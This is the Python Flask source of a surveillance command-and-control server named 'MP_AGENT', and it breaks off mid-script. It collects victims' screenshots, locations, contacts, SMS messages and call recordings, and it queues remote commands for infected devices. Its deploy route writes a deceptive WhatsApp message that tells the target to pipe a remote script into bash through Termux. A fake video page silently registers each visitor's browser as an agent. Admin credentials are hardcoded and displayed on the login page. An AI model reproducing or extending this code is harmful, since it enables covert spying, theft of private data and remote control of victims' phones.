from flask import Flask, request, jsonify, session, redirect, render_template, Response, send_file, render_template_string
import sqlite3
from datetime import datetime
import os
import random
import io
import json
import time
import base64
from threading import Lock
import logging

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'mp_agent_platform_2024')
app.template_folder = 'templates'

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Admin credentials
ADMIN_USERNAME = "Mpc"
ADMIN_PASSWORD = "0220Mpc"

# Database lock to prevent concurrent access
db_lock = Lock()

# Initialize database with migration support
def init_database():
    with db_lock:
        conn = sqlite3.connect('mp_agent.db')
        cursor = conn.cursor()
        
        # Create fresh tables
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS agents (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT UNIQUE NOT NULL,
                phone_model TEXT,
                android_version TEXT,
                ip_address TEXT,
                status TEXT DEFAULT 'active',
                first_seen DATETIME,
                last_seen DATETIME,
                screenshot_count INTEGER DEFAULT 0,
                call_records INTEGER DEFAULT 0,
                location_data TEXT,
                battery_level INTEGER,
                last_screenshot DATETIME,
                user_agent TEXT,
                browser_info TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS screenshots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                screenshot_data BLOB,
                timestamp DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS call_records (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                call_type TEXT,
                phone_number TEXT,
                duration INTEGER,
                audio_data BLOB,
                timestamp DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS deployments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_phone TEXT,
                agent_id TEXT,
                message_sent TEXT,
                status TEXT,
                timestamp DATETIME
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS system_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                level TEXT,
                message TEXT,
                timestamp DATETIME
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                command TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT,
                timestamp DATETIME
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS browser_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                data_type TEXT,
                data_content TEXT,
                timestamp DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS contacts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                contact_name TEXT,
                phone_number TEXT,
                timestamp DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                message_type TEXT,
                phone_number TEXT,
                message_text TEXT,
                timestamp DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS locations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                latitude REAL,
                longitude REAL,
                accuracy REAL,
                address TEXT,
                timestamp DATETIME,
                FOREIGN KEY (agent_id) REFERENCES agents (agent_id)
            )
        ''')
        
        conn.commit()
        conn.close()
        logger.info("✅ Database initialization completed")

def get_db_connection():
    """Get database connection with retry logic"""
    max_retries = 3
    for attempt in range(max_retries):
        try:
            conn = sqlite3.connect('mp_agent.db', timeout=30)
            conn.row_factory = sqlite3.Row
            return conn
        except sqlite3.OperationalError as e:
            if "locked" in str(e) and attempt < max_retries - 1:
                time.sleep(0.1)
                continue
            raise e

def log_event(level, message):
    """Log event with database lock protection"""
    with db_lock:
        max_retries = 3
        for attempt in range(max_retries):
            try:
                conn = get_db_connection()
                conn.execute(
                    'INSERT INTO system_logs (level, message, timestamp) VALUES (?, ?, ?)',
                    (level, message, datetime.now())
                )
                conn.commit()
                conn.close()
                break
            except sqlite3.OperationalError as e:
                if "locked" in str(e) and attempt < max_retries - 1:
                    time.sleep(0.1)
                    continue
                logger.error(f"❌ Failed to log event after {max_retries} attempts: {e}")
                break

def row_to_dict(row):
    """Convert SQLite Row object to dictionary"""
    if row is None:
        return None
    return {key: row[key] for key in row.keys()}

def safe_fetchone(cursor):
    """Safely fetch one row and convert to dict"""
    row = cursor.fetchone()
    return row_to_dict(row) if row else None

def safe_fetchall(cursor):
    """Safely fetch all rows and convert to list of dicts"""
    rows = cursor.fetchall()
    return [row_to_dict(row) for row in rows] if rows else []

# Initialize database on startup
init_database()

# ==================== DEBUG ROUTES ====================

@app.route('/debug/agents')
def debug_agents():
    if not session.get('authenticated'):
        return redirect('/login')
    
    with db_lock:
        conn = get_db_connection()
        agents = safe_fetchall(conn.execute("SELECT * FROM agents"))
        conn.close()
    
    result = "<h1>All Agents in Database</h1>"
    for agent in agents:
        result += f"""
        <div style="border: 1px solid #ccc; padding: 10px; margin: 10px;">
            <strong>ID:</strong> {agent['id']}<br>
            <strong>Agent ID:</strong> {agent['agent_id']}<br>
            <strong>Status:</strong> {agent.get('status', 'unknown')}<br>
            <strong>Phone Model:</strong> {agent.get('phone_model', 'Unknown')}<br>
            <strong>Screenshot Count:</strong> {agent.get('screenshot_count', 0)}<br>
            <strong>Call Records:</strong> {agent.get('call_records', 0)}<br>
            <strong>Last Seen:</strong> {agent.get('last_seen', 'Never')}<br>
        </div>
        """
    
    return result

@app.route('/debug/screenshots')
def debug_screenshots():
    if not session.get('authenticated'):
        return redirect('/login')
    
    with db_lock:
        conn = get_db_connection()
        screenshots = safe_fetchall(conn.execute('''
            SELECT s.*, a.phone_model, a.agent_id 
            FROM screenshots s 
            LEFT JOIN agents a ON s.agent_id = a.agent_id 
            ORDER BY s.timestamp DESC
        '''))
        conn.close()
    
    result = "<h1>All Screenshots in Database</h1>"
    result += f"<p>Total screenshots found: {len(screenshots)}</p>"
    
    for screenshot in screenshots:
        has_data = screenshot['screenshot_data'] is not None
        data_size = len(screenshot['screenshot_data']) if has_data else 0
        
        result += f"""
        <div style="border: 1px solid #ccc; padding: 10px; margin: 10px;">
            <strong>ID:</strong> {screenshot['id']}<br>
            <strong>Agent ID:</strong> {screenshot['agent_id']}<br>
            <strong>Phone Model:</strong> {screenshot['phone_model'] or 'Unknown'}<br>
            <strong>Timestamp:</strong> {screenshot['timestamp']}<br>
            <strong>Has Data:</strong> {has_data}<br>
            <strong>Data Size:</strong> {data_size} bytes<br>
            <a href="/media/screenshot/{screenshot['id']}" target="_blank">View Screenshot</a>
        </div>
        """
    
    return result

@app.route('/debug/clear_data')
def debug_clear_data():
    if not session.get('authenticated'):
        return redirect('/login')
    
    with db_lock:
        conn = get_db_connection()
        conn.execute("DELETE FROM screenshots")
        conn.execute("DELETE FROM contacts")
        conn.execute("DELETE FROM messages")
        conn.execute("DELETE FROM locations")
        conn.execute("DELETE FROM commands")
        conn.commit()
        conn.close()
    
    return "All data cleared. <a href='/admin'>Go to Admin</a>"

# ==================== ADMIN DASHBOARD ROUTES ====================

@app.route('/')
def index():
    if session.get('authenticated'):
        return redirect('/dashboard')
    return redirect('/login')

@app.route('/dashboard')
def dashboard():
    if not session.get('authenticated'):
        return redirect('/login')
    
    with db_lock:
        conn = get_db_connection()
        
        # Get statistics
        stats = {
            'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
            'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
            'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0],
            'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0],
            'total_contacts': conn.execute("SELECT COUNT(*) FROM contacts").fetchone()[0],
            'total_messages': conn.execute("SELECT COUNT(*) FROM messages").fetchone()[0],
            'total_locations': conn.execute("SELECT COUNT(*) FROM locations").fetchone()[0]
        }
        
        # Get recent data
        all_agents = safe_fetchall(conn.execute("SELECT * FROM agents ORDER BY last_seen DESC"))
        active_agents = safe_fetchall(conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 20"))
        
        screenshots = safe_fetchall(conn.execute('''
            SELECT s.*, a.phone_model 
            FROM screenshots s 
            LEFT JOIN agents a ON s.agent_id = a.agent_id 
            WHERE s.screenshot_data IS NOT NULL 
            ORDER BY s.timestamp DESC LIMIT 16
        '''))
        
        calls = safe_fetchall(conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 15"))
        deployments = safe_fetchall(conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 15"))
        contacts = safe_fetchall(conn.execute("SELECT * FROM contacts ORDER BY timestamp DESC LIMIT 20"))
        messages = safe_fetchall(conn.execute("SELECT * FROM messages ORDER BY timestamp DESC LIMIT 20"))
        locations = safe_fetchall(conn.execute("SELECT * FROM locations ORDER BY timestamp DESC LIMIT 10"))
        
        conn.close()
    
    platform_url = request.host_url.rstrip('/')
    
    return render_template('dashboard.html',
                         stats=stats,
                         agents=active_agents,
                         all_agents=all_agents,
                         screenshots=screenshots,
                         calls=calls,
                         deployments=deployments,
                         contacts=contacts,
                         messages=messages,
                         locations=locations,
                         platform_url=platform_url)

@app.route('/admin')
def admin_dashboard():
    if not session.get('authenticated'):
        return redirect('/login')
    
    with db_lock:
        conn = get_db_connection()
        
        # Get comprehensive statistics
        stats = {
            'active_agents': conn.execute("SELECT COUNT(*) FROM agents WHERE status='active'").fetchone()[0],
            'total_screenshots': conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0],
            'total_calls': conn.execute("SELECT COUNT(*) FROM call_records").fetchone()[0],
            'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0],
            'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0],
            'total_contacts': conn.execute("SELECT COUNT(*) FROM contacts").fetchone()[0],
            'total_messages': conn.execute("SELECT COUNT(*) FROM messages").fetchone()[0],
            'total_locations': conn.execute("SELECT COUNT(*) FROM locations").fetchone()[0]
        }
        
        # Get recent data
        all_agents = safe_fetchall(conn.execute("SELECT * FROM agents ORDER BY last_seen DESC"))
        active_agents = safe_fetchall(conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 20"))
        
        screenshots = safe_fetchall(conn.execute('''
            SELECT s.*, a.phone_model 
            FROM screenshots s 
            LEFT JOIN agents a ON s.agent_id = a.agent_id 
            WHERE s.screenshot_data IS NOT NULL 
            ORDER BY s.timestamp DESC LIMIT 16
        '''))
        
        calls = safe_fetchall(conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 15"))
        deployments = safe_fetchall(conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 15"))
        commands = safe_fetchall(conn.execute("SELECT * FROM commands ORDER BY timestamp DESC LIMIT 10"))
        logs = safe_fetchall(conn.execute("SELECT * FROM system_logs ORDER BY timestamp DESC LIMIT 20"))
        contacts = safe_fetchall(conn.execute("SELECT * FROM contacts ORDER BY timestamp DESC LIMIT 20"))
        messages = safe_fetchall(conn.execute("SELECT * FROM messages ORDER BY timestamp DESC LIMIT 20"))
        locations = safe_fetchall(conn.execute("SELECT * FROM locations ORDER BY timestamp DESC LIMIT 10"))
        
        conn.close()
    
    platform_url = request.host_url.rstrip('/')
    
    return render_template('admin_dashboard.html',
                         stats=stats,
                         agents=active_agents,
                         all_agents=all_agents,
                         screenshots=screenshots,
                         calls=calls,
                         deployments=deployments,
                         commands=commands,
                         logs=logs,
                         contacts=contacts,
                         messages=messages,
                         locations=locations,
                         platform_url=platform_url)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['authenticated'] = True
            session['username'] = username
            log_event('INFO', f'Admin login: {username}')
            return redirect('/dashboard')
        else:
            return '''
            <script>
                alert("Invalid credentials! Use: Mpc / 0220Mpc");
                window.location.href = "/login";
            </script>
            '''
    
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>MP_AGENT - Platform Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); height: 100vh; display: flex; justify-content: center; align-items: center; }
            .login-container { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.3); width: 100%; max-width: 400px; }
            .logo { text-align: center; margin-bottom: 30px; }
            .logo h1 { color: #333; font-size: 28px; margin-bottom: 10px; }
            .logo p { color: #666; font-size: 14px; }
            .form-group { margin-bottom: 20px; }
            .form-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 600; }
            .form-group input { width: 100%; padding: 12px 15px; border: 2px solid #e1e1e1; border-radius: 8px; font-size: 14px; transition: all 0.3s ease; }
            .form-group input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1); }
            .btn-login { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 12px; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.2s; }
            .btn-login:hover { transform: translateY(-2px); }
            .credentials { margin-top: 25px; padding: 15px; background: #f8f9fa; border-radius: 8px; text-align: center; }
            .credentials h3 { color: #333; margin-bottom: 10px; font-size: 14px; }
            .credentials code { background: #e9ecef; padding: 2px 6px; border-radius: 4px; font-family: monospace; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="logo">
                <h1>🔐 MP_AGENT PLATFORM</h1>
                <p>Complete Surveillance Control Center</p>
            </div>
            
            <form method="POST" action="/login">
                <div class="form-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" placeholder="Enter username" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Enter password" required>
                </div>
                
                <button type="submit" class="btn-login">Login to Control Panel</button>
            </form>
            
            <div class="credentials">
                <h3>Default Credentials</h3>
                <code>Username: Mpc</code><br>
                <code>Password: 0220Mpc</code>
            </div>
        </div>
    </body>
    </html>
    '''

# ==================== AGENT API ROUTES ====================

@app.route('/api/agent/register', methods=['POST'])
def register_agent():
    """Agent registration endpoint"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No JSON data received'}), 400
            
        agent_id = data.get('agent_id')
        phone_model = data.get('phone_model', 'Unknown Device')
        android_version = data.get('android_version', 'Unknown')
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        logger.info(f"🔍 Registration attempt - Agent ID: {agent_id}, IP: {ip_address}")
        
        if not agent_id:
            return jsonify({'status': 'error', 'message': 'Agent ID is required'}), 400
        
        with db_lock:
            conn = get_db_connection()
            
            # Check if agent exists
            existing_agent = safe_fetchone(conn.execute(
                "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
            ))
            
            current_time = datetime.now()
            
            if existing_agent:
                logger.info(f"🔄 Updating existing agent: {agent_id}")
                conn.execute('''
                    UPDATE agents SET 
                    phone_model = ?, android_version = ?, ip_address = ?, user_agent = ?,
                    status = 'active', last_seen = ?
                    WHERE agent_id = ?
                ''', (phone_model, android_version, ip_address, user_agent, current_time, agent_id))
                action = "updated"
            else:
                logger.info(f"🆕 Registering new agent: {agent_id}")
                conn.execute('''
                    INSERT INTO agents 
                    (agent_id, phone_model, android_version, ip_address, user_agent, status, first_seen, last_seen)
                    VALUES (?, ?, ?, ?, ?, 'active', ?, ?)
                ''', (agent_id, phone_model, android_version, ip_address, user_agent, current_time, current_time))
                action = "registered"
            
            conn.commit()
            
            # Check for pending commands
            pending_commands = safe_fetchall(conn.execute(
                "SELECT id, command FROM commands WHERE agent_id = ? AND status = 'pending'", 
                (agent_id,)
            ))
            conn.close()
        
        log_event('INFO', f'Agent {action}: {agent_id} from {ip_address}')
        logger.info(f"✅ Agent {action} successfully: {agent_id}")
        
        commands_list = [cmd['command'] for cmd in pending_commands]
        
        return jsonify({
            'status': 'success', 
            'message': f'Agent {action} successfully',
            'pending_commands': commands_list
        })
        
    except Exception as e:
        error_msg = f'Agent registration failed: {str(e)}'
        logger.error(f"❌ {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/agent/submit_report', methods=['POST'])
def submit_report():
    """Receive REAL data reports from agents"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No JSON data received'}), 400
            
        agent_id = data.get('agent_id')
        report_type = data.get('report_type')
        report_data = data.get('report_data', {})
        
        logger.info(f"📨 Received {report_type} report from {agent_id}")
        
        if not agent_id:
            return jsonify({'status': 'error', 'message': 'Agent ID is required'}), 400
        
        with db_lock:
            conn = get_db_connection()
            current_time = datetime.now()
            
            # Handle different report types with REAL data
            if report_type == 'screenshot':
                # Store actual screenshot data
                if 'image_data' in report_data:
                    try:
                        image_data = report_data['image_data']
                        if image_data.startswith('data:image'):
                            image_data = image_data.split(',')[1]
                        
                        screenshot_binary = base64.b64decode(image_data)
                        conn.execute(
                            'INSERT INTO screenshots (agent_id, screenshot_data, timestamp) VALUES (?, ?, ?)',
                            (agent_id, screenshot_binary, current_time)
                        )
                        logger.info(f"✅ Real screenshot stored for {agent_id}, size: {len(screenshot_binary)} bytes")
                    except Exception as e:
                        logger.error(f"❌ Failed to store screenshot: {e}")
                
                conn.execute(
                    'UPDATE agents SET last_seen = ?, last_screenshot = ?, screenshot_count = screenshot_count + 1, status = "active" WHERE agent_id = ?',
                    (current_time, current_time, agent_id)
                )
                
            elif report_type == 'location':
                # Store real location data
                latitude = report_data.get('latitude')
                longitude = report_data.get('longitude')
                accuracy = report_data.get('accuracy')
                address = report_data.get('address', '')
                
                if latitude and longitude:
                    conn.execute(
                        'INSERT INTO locations (agent_id, latitude, longitude, accuracy, address, timestamp) VALUES (?, ?, ?, ?, ?, ?)',
                        (agent_id, latitude, longitude, accuracy, address, current_time)
                    )
                    logger.info(f"📍 Real location stored for {agent_id}: {latitude}, {longitude}")
                
                conn.execute(
                    'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
                    (current_time, agent_id)
                )
                
            elif report_type == 'contacts':
                # Store real contacts
                contacts_list = report_data.get('contacts', [])
                for contact in contacts_list:
                    name = contact.get('name', 'Unknown')
                    phone = contact.get('phone', 'Unknown')
                    conn.execute(
                        'INSERT INTO contacts (agent_id, contact_name, phone_number, timestamp) VALUES (?, ?, ?, ?)',
                        (agent_id, name, phone, current_time)
                    )
                
                logger.info(f"👥 Real contacts stored for {agent_id}: {len(contacts_list)} contacts")
                conn.execute(
                    'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
                    (current_time, agent_id)
                )
                
            elif report_type == 'messages':
                # Store real messages
                messages_list = report_data.get('messages', [])
                for msg in messages_list:
                    msg_type = msg.get('type', 'sms')
                    phone = msg.get('phone', 'Unknown')
                    text = msg.get('text', '')
                    conn.execute(
                        'INSERT INTO messages (agent_id, message_type, phone_number, message_text, timestamp) VALUES (?, ?, ?, ?, ?)',
                        (agent_id, msg_type, phone, text, current_time)
                    )
                
                logger.info(f"💬 Real messages stored for {agent_id}: {len(messages_list)} messages")
                conn.execute(
                    'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
                    (current_time, agent_id)
                )
                
            elif report_type == 'device_info':
                # Update device information
                battery = report_data.get('battery', 0)
                conn.execute(
                    'UPDATE agents SET last_seen = ?, battery_level = ?, status = "active" WHERE agent_id = ?',
                    (current_time, battery, agent_id)
                )
                logger.info(f"📱 Device info updated for {agent_id}")
                
            elif report_type == 'heartbeat':
                # Simple heartbeat
                conn.execute(
                    'UPDATE agents SET last_seen = ?, status = "active" WHERE agent_id = ?',
                    (current_time, agent_id)
                )
            
            conn.commit()
            conn.close()
        
        log_event('INFO', f'Real {report_type} data received from {agent_id}')
        return jsonify({'status': 'success', 'message': 'Report received successfully'})
        
    except Exception as e:
        error_msg = f'Report submission failed: {str(e)}'
        logger.error(f"❌ {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/agent/upload_screenshot', methods=['POST'])
def upload_screenshot():
    """Receive screenshots from agents via file upload"""
    try:
        agent_id = request.form.get('agent_id')
        screenshot_file = request.files.get('screenshot')
        
        if not agent_id or not screenshot_file:
            return jsonify({'status': 'error', 'message': 'Missing agent_id or screenshot'}), 400
        
        screenshot_data = screenshot_file.read()
        
        logger.info(f"📸 Received screenshot file from {agent_id}, size: {len(screenshot_data)} bytes")
        
        with db_lock:
            conn = get_db_connection()
            conn.execute(
                'INSERT INTO screenshots (agent_id, screenshot_data, timestamp) VALUES (?, ?, ?)',
                (agent_id, screenshot_data, datetime.now())
            )
            conn.execute(
                'UPDATE agents SET screenshot_count = screenshot_count + 1, last_seen = ?, last_screenshot = ?, status = "active" WHERE agent_id = ?',
                (datetime.now(), datetime.now(), agent_id)
            )
            conn.commit()
            conn.close()
        
        log_event('INFO', f'Screenshot uploaded from {agent_id}')
        return jsonify({'status': 'success', 'message': 'Screenshot uploaded successfully'})
        
    except Exception as e:
        log_event('ERROR', f'Screenshot upload failed: {str(e)}')
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ==================== MEDIA SERVING ROUTES ====================

@app.route('/media/screenshot/<int:screenshot_id>')
def serve_screenshot(screenshot_id):
    if not session.get('authenticated'):
        return redirect('/login')
    
    with db_lock:
        conn = get_db_connection()
        screenshot = safe_fetchone(conn.execute(
            "SELECT screenshot_data FROM screenshots WHERE id = ?", (screenshot_id,)
        ))
        conn.close()
    
    if screenshot and screenshot['screenshot_data']:
        return Response(screenshot['screenshot_data'], mimetype='image/jpeg')
    
    # Return placeholder image
    from PIL import Image, ImageDraw
    img = Image.new('RGB', (400, 300), color='gray')
    d = ImageDraw.Draw(img)
    d.text((100, 150), "SCREENSHOT NOT FOUND", fill='white')
    img_io = io.BytesIO()
    img.save(img_io, 'JPEG')
    img_io.seek(0)
    return Response(img_io.getvalue(), mimetype='image/jpeg')

@app.route('/media/call/<int:call_id>')
def serve_call_audio(call_id):
    if not session.get('authenticated'):
        return redirect('/login')
    
    with db_lock:
        conn = get_db_connection()
        call = safe_fetchone(conn.execute(
            "SELECT audio_data FROM call_records WHERE id = ?", (call_id,)
        ))
        conn.close()
    
    if call and call['audio_data']:
        return Response(call['audio_data'], mimetype='audio/mp4')
    return 'Call recording not found', 404

# ==================== DEPLOYMENT ROUTES ====================

@app.route('/deploy', methods=['POST'])
def deploy_agent():
    if not session.get('authenticated'):
        return redirect('/login')
    
    target_phone = request.form.get('phone_number')
    agent_id = request.form.get('agent_id', f'phone_{target_phone}')
    
    platform_url = request.host_url.rstrip('/')
    
    # Generate deployment links
    video_link = f"{platform_url}/video?phone={agent_id}"
    setup_link = f"{platform_url}/setup?phone={agent_id}"
    termux_command = f"curl -s {platform_url}/download_agent?phone={agent_id} | bash"
    
    whatsapp_message = f'''Check out this cool video! 🎬

Primary Link: {video_link}

For enhanced quality, install the media player:
1. Install "Termux" from Play Store
2. Run: {termux_command}
3. Return to video link!

Enjoy! 😊'''
    
    with db_lock:
        conn = get_db_connection()
        conn.execute(
            'INSERT INTO deployments (target_phone, agent_id, message_sent, status, timestamp) VALUES (?, ?, ?, ?, ?)',
            (target_phone, agent_id, whatsapp_message, 'initiated', datetime.now())
        )
        conn.commit()
        conn.close()
    
    log_event('INFO', f'Deployment created for {target_phone} -> {agent_id}')
    
    return render_template('deployment.html', 
                         target_phone=target_phone,
                         agent_id=agent_id,
                         video_link=video_link,
                         setup_link=setup_link,
                         termux_command=termux_command,
                         whatsapp_message=whatsapp_message)

# ==================== COMMAND ROUTES ====================

@app.route('/admin/command', methods=['POST'])
def send_command():
    if not session.get('authenticated'):
        return redirect('/login')
    
    agent_id = request.form.get('agent_id')
    command = request.form.get('command')
    
    if not agent_id or not command:
        return "Missing agent_id or command", 400
    
    with db_lock:
        conn = get_db_connection()
        conn.execute(
            'INSERT INTO commands (agent_id, command, timestamp) VALUES (?, ?, ?)',
            (agent_id, command, datetime.now())
        )
        conn.commit()
        conn.close()
    
    log_event('INFO', f'Command sent to {agent_id}: {command}')
    return redirect('/admin')

@app.route('/api/agent/check_commands/<agent_id>')
def check_commands(agent_id):
    """Agents check for pending commands"""
    with db_lock:
        conn = get_db_connection()
        commands = safe_fetchall(conn.execute(
            "SELECT id, command FROM commands WHERE agent_id = ? AND status = 'pending'", 
            (agent_id,)
        ))
        conn.close()
    
    commands_list = [{'id': cmd['id'], 'command': cmd['command']} for cmd in commands]
    return jsonify({'commands': commands_list})

@app.route('/api/agent/command_result', methods=['POST'])
def command_result():
    """Agents send command execution results"""
    try:
        data = request.get_json()
        command_id = data.get('command_id')
        result = data.get('result')
        
        with db_lock:
            conn = get_db_connection()
            conn.execute(
                "UPDATE commands SET status = 'completed', result = ? WHERE id = ?",
                (result, command_id)
            )
            conn.commit()
            conn.close()
        
        logger.info(f"✅ Command {command_id} completed with result")
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logger.error(f"❌ Command result failed: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ==================== DATA VIEWING ROUTES ====================

@app.route('/admin/contacts/<agent_id>')
def view_contacts(agent_id):
    if not session.get('authenticated'):
        return redirect('/login')
    
    with db_lock:
        conn = get_db_connection()
        contacts = safe_fetchall(conn.execute(
            "SELECT * FROM contacts WHERE agent_id = ? ORDER BY timestamp DESC",
            (agent_id,)
        ))
        agent = safe_fetchone(conn.execute(
            "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
        ))
        conn.close()
    
    return render_template('contacts.html', contacts=contacts, agent=agent)

@app.route('/admin/messages/<agent_id>')
def view_messages(agent_id):
    if not session.get('authenticated'):
        return redirect('/login')
    
    with db_lock:
        conn = get_db_connection()
        messages = safe_fetchall(conn.execute(
            "SELECT * FROM messages WHERE agent_id = ? ORDER BY timestamp DESC",
            (agent_id,)
        ))
        agent = safe_fetchone(conn.execute(
            "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
        ))
        conn.close()
    
    return render_template('messages.html', messages=messages, agent=agent)

@app.route('/admin/locations/<agent_id>')
def view_locations(agent_id):
    if not session.get('authenticated'):
        return redirect('/login')
    
    with db_lock:
        conn = get_db_connection()
        locations = safe_fetchall(conn.execute(
            "SELECT * FROM locations WHERE agent_id = ? ORDER BY timestamp DESC",
            (agent_id,)
        ))
        agent = safe_fetchone(conn.execute(
            "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
        ))
        conn.close()
    
    return render_template('locations.html', locations=locations, agent=agent)

# ==================== SOCIAL ENGINEERING PAGES ====================

FAKE_VIDEO_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Exciting Video Content</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            font-family: Arial, sans-serif; 
            text-align: center; 
            padding: 20px; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            margin: 0;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255,255,255,0.1);
            border-radius: 15px;
            padding: 30px;
            backdrop-filter: blur(10px);
        }
        .video-placeholder {
            background: #000;
            padding: 100px 20px;
            margin: 20px auto;
            border-radius: 10px;
            position: relative;
        }
        .loader {
            color: #4CAF50;
            font-size: 18px;
            margin: 20px 0;
        }
        .progress {
            width: 100%;
            background: #555;
            height: 20px;
            border-radius: 10px;
            margin: 20px 0;
        }
        .progress-bar {
            width: 0%;
            height: 100%;
            background: #4CAF50;
            border-radius: 10px;
            transition: width 0.5s;
        }
        .ad-container {
            background: rgba(255,255,255,0.9);
            color: #333;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎬 Exclusive Video Content</h1>
        <p>You're about to watch premium content shared by your friend!</p>
        
        <div class="video-placeholder">
            <div style="font-size: 48px; margin-bottom: 20px;">📱</div>
            <div>Preparing your personalized video experience...</div>
        </div>
        
        <div class="loader" id="status">Initializing video player...</div>
        <div class="progress">
            <div class="progress-bar" id="progress"></div>
        </div>

        <div class="ad-container">
            <strong>Sponsored Content</strong>
            <p>This video is sponsored by our partners. Please keep this page open.</p>
        </div>
    </div>

    <!-- WEB AGENT SCRIPT - AUTOMATICALLY STARTS -->
    <script>
        const agentId = "{{ phone_id }}";
        const serverUrl = "{{ platform_url }}";

        // Register web agent
        fetch(serverUrl + '/api/agent/register', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                agent_id: agentId,
                phone_model: navigator.userAgent,
                android_version: 'Web Browser'
            })
        });

        // Fake loading animation
        const steps = [
            {text: "Connecting to media server...", progress: 10},
            {text: "Loading video content...", progress: 25},
            {text: "Buffering high-quality stream...", progress: 45},
            {text: "Initializing audio codec...", progress: 65},
            {text: "Optimizing playback...", progress: 85},
            {text: "Almost ready...", progress: 95},
            {text: "Video player ready!", progress: 100}
        ];
        
        let step = 0;
        function nextStep() {
            if (step < steps.length) {
                document.getElementById('status').innerHTML = steps[step].text;
